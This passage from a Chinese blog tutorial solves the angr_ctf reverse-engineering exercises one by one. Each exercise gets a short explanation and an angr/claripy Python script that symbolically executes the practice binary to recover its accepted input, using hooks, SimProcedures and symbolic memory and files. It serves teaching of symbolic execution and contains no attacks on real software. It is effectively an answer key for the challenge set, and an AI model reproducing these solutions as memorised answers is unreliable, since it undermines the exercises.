s.found:</span><br><span class="line">    print(s.found[0].posix.dumps(0))    #打印输入</span><br><span class="line">else:</span><br><span class="line">    print(&quot;fail&quot;)</span><br></pre></td></tr></table></figure><p>运行得出结果:<br><img src="/img/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/angr_find2.png"></p><h2 id="angr-avoid"><a href="#angr-avoid" class="headerlink" title="angr_avoid"></a>angr_avoid</h2><p>这题的文件大小就预示着它很不一般，尤其是不要试图F5它的main()函数，会死机。<br>在maby_good()函数里看见有一个should_succeed：<br><img src="/img/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/angr_avoid1.png"><br>查看交叉引用，发现它在avoid_me()函数中被赋0，而avoid_me()函数被调用了……8191次……<br><img src="/img/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/angr_avoid2.png"><br>写出脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(&#x27;./01_angr_avoid&#x27;)</span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line">s = p.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">s.explore(find = 0x080485E0, avoid = 0x080485AB)</span><br><span class="line"></span><br><span class="line">if s.found:</span><br><span class="line">    print(s.found[0].posix.dumps(0))</span><br><span class="line">else:</span><br><span class="line">    print(&quot;fail&quot;)</span><br></pre></td></tr></table></figure><p>运行得出结果<br><img src="/img/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/angr_avoid3.png"></p><h2 id="angr-find-condition"><a href="#angr-find-condition" class="headerlink" title="angr_find_condition"></a>angr_find_condition</h2><p>虽然主函数看起来人畜无害<br><img src="/img/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/angr_find_condition1.png"><br>但是左下角的graph view非常感人<br><img src="/img/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/angr_find_condition2.png"><br>这个程序输出成功&#x2F;失败提示的地方非常的多，用地址是不可能的了，所以检测输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line"></span><br><span class="line">def aim_out(state):</span><br><span class="line">    return b&#x27;Good Job.&#x27; in state.posix.dumps(1)     #检查输出</span><br><span class="line"></span><br><span class="line">def avoid_out(state):</span><br><span class="line">    return b&#x27;Try again.&#x27; in state.posix.dumps(1)    #检查输出</span><br><span class="line"></span><br><span class="line">p = angr.Project(&#x27;./02_angr_find_condition&#x27;)</span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line">s = p.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">s.explore(find = aim_out, avoid = avoid_out)</span><br><span class="line"></span><br><span class="line">if s.found:</span><br><span class="line">    print(s.found[0].posix.dumps(0))</span><br><span class="line">else:</span><br><span class="line">    print(&quot;fail&quot;)</span><br></pre></td></tr></table></figure><p>运行得出结果<br><img src="/img/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/angr_find_condition3.png"></p><h2 id="angr-symbolic-registers"><a href="#angr-symbolic-registers" class="headerlink" title="angr_symbolic_registers"></a>angr_symbolic_registers</h2><p>题目描述说angr做不了三个输入的题，所以要人为构造输入，在IDA里找到三个位置分别是eax,ebx,edx<br><img src="/img/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/angr_symbolic_registers1.png"><br>写出脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line">import claripy</span><br><span class="line"></span><br><span class="line">def aim_out(state):</span><br><span class="line">    return b&#x27;Good Job.&#x27; in state.posix.dumps(1)</span><br><span class="line"></span><br><span class="line">def avoid_out(state):</span><br><span class="line">    return b&#x27;Try again.&#x27; in state.posix.dumps(1)</span><br><span class="line"></span><br><span class="line">p = angr.Project(&#x27;./03_angr_symbolic_registers&#x27;)</span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line"># init_state = p.factory.blank_state(addr = 0x08048980)   #自定义入口点，调用输入“之后”的地址</span><br><span class="line"># input0 = claripy.BVS(&#x27;input0&#x27;, 4 * 8)                   #自定义输入，通过IDA查看输入的大小</span><br><span class="line"># input1 = claripy.BVS(&#x27;input1&#x27;, 4 * 8)</span><br><span class="line"># input2 = claripy.BVS(&#x27;input2&#x27;, 4 * 8)</span><br><span class="line"># init_state.regs.eax = input0                            #自定义输入的位置(寄存器)，通过IDA查看</span><br><span class="line"># init_state.regs.ebx = input1</span><br><span class="line"># init_state.regs.edx = input2</span><br><span class="line"></span><br><span class="line">s = p.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">s.explore(find = aim_out, avoid = avoid_out)</span><br><span class="line"></span><br><span class="line">if s.found:</span><br><span class="line">    # print((&#x27;&#123;:x&#125; &#123;:x&#125; &#123;:x&#125;&#x27;.format(s.found[0].solver.eval(input0), s.found[0].solver.eval(input1), s.found[0].solver.eval(input2))))</span><br><span class="line">    print(s.found[0].posix.dumps(0))</span><br><span class="line">else:</span><br><span class="line">    print(&quot;fail&quot;)</span><br></pre></td></tr></table></figure><p>为什么注释掉了一大堆捏？因为用推荐的方法写会报一大坨错，说数组越界，甚至用它给的标准答案都不行。angr在最初并不那么高级，但是现在高级了，也就不用这样了(然鹅理论上不应该报错才对)。运行得到结果<br><img src="/img/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/angr_symbolic_registers2.png"></p><h2 id="angr-symbolic-stack"><a href="#angr-symbolic-stack" class="headerlink" title="angr_symbolic_stack"></a>angr_symbolic_stack</h2><p>同上一题，本意是在栈中手动模拟栈的操作，但是现在angr可以自己解决这个问题了。<br><img src="/img/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/angr_symbolic_stack1.png"><br>add&amp;emsp;esp, 10h是恢复栈的操作，因此我们从0x8048697开始程序，并手动将两个输入填充到占空间上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line">import claripy</span><br><span class="line"></span><br><span class="line">def aim_out(state):</span><br><span class="line">    return b&#x27;Good Job.&#x27; in state.posix.dumps(1)</span><br><span class="line"></span><br><span class="line">def avoid_out(state):</span><br><span class="line">    return b&#x27;Try again.&#x27; in state.posix.dumps(1)</span><br><span class="line"></span><br><span class="line">p = angr.Project(&#x27;./04_angr_symbolic_stack&#x27;)</span><br><span class="line"># init_state = p.factory.entry_state()</span><br><span class="line">init_state = p.factory.blank_state(addr = 0x08048697)       #人为创造入口点</span><br><span class="line">init_state.regs.ebp = init_state.regs.esp                   #初始化ebp</span><br><span class="line">input0 = claripy.BVS(&#x27;input0&#x27;, 4 * 8)</span><br><span class="line">input1 = claripy.BVS(&#x27;input1&#x27;, 4 * 8)</span><br><span class="line">padding = 8</span><br><span class="line">init_state.regs.esp -= 8</span><br><span class="line"></span><br><span class="line">init_state.stack_push(input0)</span><br><span class="line">init_state.stack_push(input1)</span><br><span class="line"></span><br><span class="line">s = p.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">s.explore(find = aim_out, avoid = avoid_out)</span><br><span class="line"></span><br><span class="line">if s.found:</span><br><span class="line">    print((&#x27;&#123;:d&#125; &#123;:d&#125;&#x27;.format(s.found[0].solver.eval(input0), s.found[0].solver.eval(input1))))</span><br><span class="line">    # print(s.found[0].posix.dumps(0))</span><br><span class="line">else:</span><br><span class="line">    print(&quot;fail&quot;)</span><br></pre></td></tr></table></figure><p>具体原因如下<br><img src="/img/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/angr_symbolic_stack2.png"><br>运行得到结果<br><img src="/img/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/angr_symbolic_stack3.png"><br>诶嘿，这个可以正常运行而且没有WARNING诶~</p><h2 id="angr-symbolic-memory"><a href="#angr-symbolic-memory" class="headerlink" title="angr_symbolic_memory"></a>angr_symbolic_memory</h2><p>这一题需要我们在.bss段创建输入，同样的，现在的angr已经不需要这么做了。<br><img src="/img/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/angr_symbolic_memory1.png"><br>写出代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line">import claripy</span><br><span class="line"></span><br><span class="line">def aim_out(state):</span><br><span class="line">    return b&#x27;Good Job.&#x27; in state.posix.dumps(1)</span><br><span class="line"></span><br><span class="line">def avoid_out(state):</span><br><span class="line">    return b&#x27;Try again.&#x27; in state.posix.dumps(1)</span><br><span class="line"></span><br><span class="line">p = angr.Project(&#x27;./05_angr_symbolic_memory&#x27;)</span><br><span class="line">init_state = p.factory.blank_state(addr = 0x08048601)       #在scanf()之后开始</span><br><span class="line"></span><br><span class="line">input0 = claripy.BVS(&#x27;input0&#x27;, 64)</span><br><span class="line">input1 = claripy.BVS(&#x27;input1&#x27;, 64)</span><br><span class="line">input2 = claripy.BVS(&#x27;input2&#x27;, 64)</span><br><span class="line">input3 = claripy.BVS(&#x27;input3&#x27;, 64)</span><br><span class="line">init_state.memory.store(0x0A1BA1C0, input0)                 #在.bss段存入数据</span><br><span class="line">init_state.memory.store(0x0A1BA1C8, input1)</span><br><span class="line">init_state.memory.store(0x0A1BA1D0, input2)</span><br><span class="line">init_state.memory.store(0x0A1BA1D8, input3)</span><br><span class="line"></span><br><span class="line">s = p.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">s.explore(find = aim_out, avoid = avoid_out)</span><br><span class="line"></span><br><span class="line">if s.found:</span><br><span class="line">    print((&#x27;&#123;&#125; &#123;&#125; &#123;&#125; &#123;&#125;&#x27;.format(s.found[0].solver.eval(input0, cast_to = bytes), s.found[0].solver.eval(input1, cast_to = bytes), s.found[0].solver.eval(input2, cast_to = bytes), s.found[0].solver.eval(input3, cast_to = bytes))))</span><br><span class="line">else:</span><br><span class="line">    print(&quot;fail&quot;)</span><br></pre></td></tr></table></figure><p>运行得出结果<br><img src="/img/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/angr_symbolic_memory2.png"><br>这次的运行速度和普通写法差不多，相比于前几题慢了一些</p><h2 id="angr-symbolic-dynamic-memory"><a href="#angr-symbolic-dynamic-memory" class="headerlink" title="angr_symbolic_dynamic_memory"></a>angr_symbolic_dynamic_memory</h2><p>这一题需要我们在堆区写入输入<br><img src="/img/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/angr_symbolic_dynamic_memory1.png"><br>写出脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line">import claripy</span><br><span class="line"></span><br><span class="line">def aim_out(state):</span><br><span class="line">    return b&#x27;Good Job.&#x27; in state.posix.dumps(1)</span><br><span class="line"></span><br><span class="line">def avoid_out(state):</span><br><span class="line">    return b&#x27;Try again.&#x27; in state.posix.dumps(1)</span><br><span class="line"></span><br><span class="line">p = angr.Project(&#x27;./06_angr_symbolic_dynamic_memory&#x27;)</span><br><span class="line">init_state = p.factory.blank_state(addr = 0x08048699)</span><br><span class="line"></span><br><span class="line">input0 = claripy.BVS(&#x27;input0&#x27;, 64)</span><br><span class="line">input1 = claripy.BVS(&#x27;input1&#x27;, 64)</span><br><span class="line">fake_heap0 = 0x0ABCC88F                                                                 #在.bss段随便找一块没用的，人为创建堆</span><br><span class="line">fake_heap1 = 0x0ABCC859</span><br><span class="line">addr_input0 = 0x0ABCC8A4                                                                #记录输入的地址</span><br><span class="line">addr_input1 = 0x0ABCC8AC</span><br><span class="line">init_state.memory.store(addr_input0, fake_heap0, endness = p.arch.memory_endness)       #将输入数据的指针指向构建的堆区并采用小端存储</span><br><span class="line">init_state.memory.store(addr_input1, fake_heap1, endness = p.arch.memory_endness)</span><br><span class="line">init_state.memory.store(fake_heap0, input0)                                             #将输入存进堆区</span><br><span class="line">init_state.memory.store(fake_heap1, input1)</span><br><span class="line"></span><br><span class="line">s = p.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">s.explore(find = aim_out, avoid = avoid_out)</span><br><span class="line"></span><br><span class="line">if s.found:</span><br><span class="line">    print(s.found[0].solver.eval(input0, cast_to = bytes) + b&#x27; &#x27; + s.found[0].solver.eval(input1, cast_to = bytes))</span><br><span class="line">else:</span><br><span class="line">    print(&quot;fail&quot;)</span><br></pre></td></tr></table></figure><p>运行得出结果<br><img src="/img/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/angr_symbolic_dynamic_memory2.png"></p><h2 id="angr-symbolic-file"><a href="#angr-symbolic-file" class="headerlink" title="angr_symbolic_file"></a>angr_symbolic_file</h2><p>这题在文件中创建输入,从fopen前执行angr<br><img src="/img/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/angr_symbolic_file1.png"><br>写出脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line">import claripy</span><br><span class="line"></span><br><span class="line">def aim_out(state):</span><br><span class="line">    return b&#x27;Good Job.&#x27; in state.posix.dumps(1)</span><br><span class="line"></span><br><span class="line">def avoid_out(state):</span><br><span class="line">    return b&#x27;Try again.&#x27; in state.posix.dumps(1)</span><br><span class="line"></span><br><span class="line">p = angr.Project(&#x27;./07_angr_symbolic_file&#x27;)</span><br><span class="line">init_state = p.factory.blank_state(addr = 0x080488EA)</span><br><span class="line"></span><br><span class="line">filename = &#x27;OJKSQYDP.txt&#x27;                                           #定义文件名字</span><br><span class="line">file_size = 8                                                       #虽然文件开了64 bytes，但是根据后续可知只用到了8 bytes</span><br><span class="line">input = claripy.BVS(&#x27;input&#x27;, file_size * 8)</span><br><span class="line">file = angr.SimFile(name = filename, content = input, size = 8)     #填充文件内容</span><br><span class="line">init_state.fs.insert(filename, file)                                #将文件和angr建立联系</span><br><span class="line"></span><br><span class="line">s = p.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">s.explore(find = aim_out, avoid = avoid_out)</span><br><span class="line"></span><br><span class="line">if s.found:</span><br><span class="line">    print(s.found[0].solver.eval(input, cast_to = bytes))</span><br><span class="line">else:</span><br><span class="line">    print(&quot;fail&quot;)</span><br></pre></td></tr></table></figure><p>运行得出结果<br><img src="/img/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/angr_symbolic_file2.png"></p><h2 id="angr-constraints"><a href="#angr-constraints" class="headerlink" title="angr_constraints"></a>angr_constraints</h2><p>这一题的对比函数会将16个字符判断完成后在进行反馈，这会导致angr的路径爆炸，因此我们需要在对比之前停下程序，自行对比<br><img src="/img/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/angr_constraints1.png"><br>可以写出脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line">import claripy</span><br><span class="line"></span><br><span class="line">p = angr.Project(&#x27;./08_angr_constraints&#x27;)</span><br><span class="line">init_state = p.factory.blank_state(addr = 0x08048625)       #在scanf()后开始</span><br><span class="line">input = claripy.BVS(&#x27;input&#x27;, 16 * 8)</span><br><span class="line">init_state.memory.store(0x0804A050, input)                  #在.bss段存入输入</span><br><span class="line"># init_state = p.factory.entry_state()</span><br><span class="line">s = p.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">s.explore(find = 0x0804866C)                                #在对比函数前停止</span><br><span class="line"></span><br><span class="line">if s.found:</span><br><span class="line">    cmp_BVS = s.found[0].memory.load(0x0804A050, 16)        #调取加密后的输入</span><br><span class="line">    aim_BVS = b&#x27;AUPDNNPROEZRJWKB&#x27;                           #调取目标值</span><br><span class="line">    s.found[0].add_constraints(cmp_BVS == aim_BVS)          #添加成功条件</span><br><span class="line">    print(s.found[0].solver.eval(input, cast_to = bytes))</span><br><span class="line">    # print(s.found[0].posix.dumps(0))</span><br><span class="line">else:</span><br><span class="line">    print(&quot;fail&quot;)</span><br></pre></td></tr></table></figure><p>现在angr高级了，在.bss存数据那一段用注释的内容也可以。运行得出结果<br><img src="/img/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/angr_constraints2.png"></p><h2 id="angr-hooks"><a href="#angr-hooks" class="headerlink" title="angr_hooks"></a>angr_hooks</h2><p>本题中需要我们自行改写一个函数来避免路径爆炸<br><img src="/img/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/angr_hooks1.png"><br>写出代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line">import claripy</span><br><span class="line"></span><br><span class="line">p = angr.Project(&#x27;./09_angr_hooks&#x27;)</span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line"></span><br><span class="line">hook_addr = 0x080486B3                                                                              #被hook的函数的call指令地址</span><br><span class="line">skip_length = 5                                                                                     #此条call指令所占字节</span><br><span class="line">@p.hook(hook_addr, length = skip_length)                                                            #进行hook，“length = ”必须写</span><br><span class="line"></span><br><span class="line">def my_check(state):                                                                                #创造自己的函数</span><br><span class="line">    cmp_BVS = state.memory.load(0x0804A054, 16)</span><br><span class="line">    aim_BVS = b&#x27;XYMKBKUHNIQYNQXE&#x27;</span><br><span class="line">    state.regs.eax = claripy.If(cmp_BVS == aim_BVS, claripy.BVV(1, 32), claripy.BVV(0, 32))         #必须使用z3语法，必须使用BVV</span><br><span class="line"></span><br><span class="line">s = p.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">def aim_out(state):</span><br><span class="line">    return b&#x27;Good Job.&#x27; in state.posix.dumps(1)</span><br><span class="line"></span><br><span class="line">def avoid_out(state):</span><br><span class="line">    return b&#x27;Try again.&#x27; in state.posix.dumps(1)</span><br><span class="line"></span><br><span class="line">s.explore(find = aim_out, avoid = avoid_out)</span><br><span class="line"></span><br><span class="line">if s.found:</span><br><span class="line">    print(s.found[0].posix.dumps(0))</span><br><span class="line">else:</span><br><span class="line">    print(&quot;fail&quot;)</span><br></pre></td></tr></table></figure><p>运行得出结果<br><img src="/img/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/angr_hooks2.png"></p><h2 id="angr-simprocedures"><a href="#angr-simprocedures" class="headerlink" title="angr_simprocedures"></a>angr_simprocedures</h2><p>这一题还是hook函数，不过这个函数被调用了256次。因此我们决定hook函数本身而不是像上一题那样hook调用的指令<br><img src="/img/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/angr_simprocedures1.png"><br>写出脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line">import claripy</span><br><span class="line"></span><br><span class="line">p = angr.Project(&#x27;./10_angr_simprocedures&#x27;)</span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line"></span><br><span class="line">class my_check(angr.SimProcedure):                                                          #定义自己的函数</span><br><span class="line">    def run(self, Str, len):                                                                #self之后的参数为被hook函数的参数</span><br><span class="line">        cmp_BVS = self.state.memory.load(Str, len)</span><br><span class="line">        aim_BVS = b&#x27;ORSDDWXHZURJRBDH&#x27;</span><br><span class="line">        return claripy.If(cmp_BVS == aim_BVS, claripy.BVV(1, 32), claripy.BVV(0, 32))</span><br><span class="line"></span><br><span class="line"># hook_func_name = &#x27;check_equals_ORSDDWXHZURJRBDH&#x27;</span><br><span class="line"># p.hook_symbol(hook_func_name, my_check())                                                 #第一种hook方式</span><br><span class="line">hook_func_addr = 0x080485F5</span><br><span class="line">p.hook(hook_func_addr, my_check())                                                          #第二种hook方式</span><br><span class="line"></span><br><span class="line">s = p.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">def aim_out(state):</span><br><span class="line">    return b&#x27;Good Job.&#x27; in state.posix.dumps(1)</span><br><span class="line"></span><br><span class="line">def avoid_out(state):</span><br><span class="line">    return b&#x27;Try again.&#x27; in state.posix.dumps(1)</span><br><span class="line"></span><br><span class="line">s.explore(find = aim_out, avoid = avoid_out)</span><br><span class="line"></span><br><span class="line">if s.found:</span><br><span class="line">    print(s.found[0].posix.dumps(0))</span><br><span class="line">else:</span><br><span class="line">    print(&quot;fail&quot;)</span><br></pre></td></tr></table></figure><p>运行得出结果<br><img src="/img/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/angr_simprocedures2.png"></p><h2 id="angr-sim-scanf"><a href="#angr-sim-scanf" class="headerlink" title="angr_sim_scanf"></a>angr_sim_scanf</h2><p>这一题的scanf()函数被调用了256次，由于古老版本angr处理不了多参数输入，因此需要hook，但现在angr已经不需要了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line">import claripy</span><br><span class="line"></span><br><span class="line">p = angr.Project(&#x27;./11_angr_sim_scanf&#x27;)</span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line"></span><br><span class="line">class my_scanf(angr.SimProcedure):</span><br><span class="line">    def run(self, format_string, input_addr0, input_addr1):</span><br><span class="line">        input0 = claripy.BVS(&#x27;input0&#x27;, 32)                                                  #创建输入</span><br><span class="line">        input1 = claripy.BVS(&#x27;input1&#x27;, 32)</span><br><span class="line">        self.state.memory.store(input_addr0, input0, endness = p.arch.memory_endness)       #存储输入</span><br><span class="line">        self.state.memory.store(input_addr1, input1, endness = p.arch.memory_endness)</span><br><span class="line">        self.state.globals[&#x27;input0&#x27;] = input0                                               #全局化输入</span><br><span class="line">        self.state.globals[&#x27;input1&#x27;] = input1</span><br><span class="line"></span><br><span class="line">p.hook_symbol(&#x27;__isoc99_scanf&#x27;, my_scanf())</span><br><span class="line"></span><br><span class="line">s = p.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">def aim_out(state):</span><br><span class="line">    return b&#x27;Good Job.&#x27; in state.posix.dumps(1)</span><br><span class="line"></span><br><span class="line">def avoid_out(state):</span><br><span class="line">    return b&#x27;Try again.&#x27; in state.posix.dumps(1)</span><br><span class="line"></span><br><span class="line">s.explore(find = aim_out, avoid = avoid_out)</span><br><span class="line"></span><br><span class="line">if s.found:</span><br><span class="line">    print(s.found[0].solver.eval(s.found[0].globals[&#x27;input0&#x27;]), s.found[0].solver.eval(s.found[0].globals[&#x27;input1&#x27;]))</span><br><span class="line">else:</span><br><span class="line">    print(&quot;fail&quot;)</span><br></pre></td></tr></table></figure><p>运行得出结果<br><img src="/img/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/angr_sim_scanf1.png"></p><h2 id="angr-veritesting"><a href="#angr-veritesting" class="headerlink" title="angr_veritesting"></a>angr_veritesting</h2><p>Angr越来越高级了，现在我们只需要半行代码就可以自动规避一些路径爆炸了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line"></span><br><span class="line">p = 